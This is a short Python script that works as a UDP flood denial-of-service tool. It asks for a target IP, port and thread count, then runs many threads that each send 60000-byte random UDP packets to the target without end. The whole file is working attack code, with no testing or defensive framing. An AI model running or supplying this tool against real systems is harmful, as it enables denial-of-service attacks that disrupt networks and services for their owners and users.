# -*- coding: utf-8 -*-
import socket
import random
import threading
import os
os.system('cls||clear')

ip = input("Target: ")
port = input("Port: ")
th = input("Threads: ")

addr = (str(ip), int(port))

def attack():
	while (True):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		try:
				data = random._urandom(60000)
				s.sendto(data, addr)
		except:
				s.close()

def threader():
	global threads
	threads = []
	for i in range(int(th)):
		t = threading.Thread(target=attack)
		threads.append(t)
		t.start()


threader()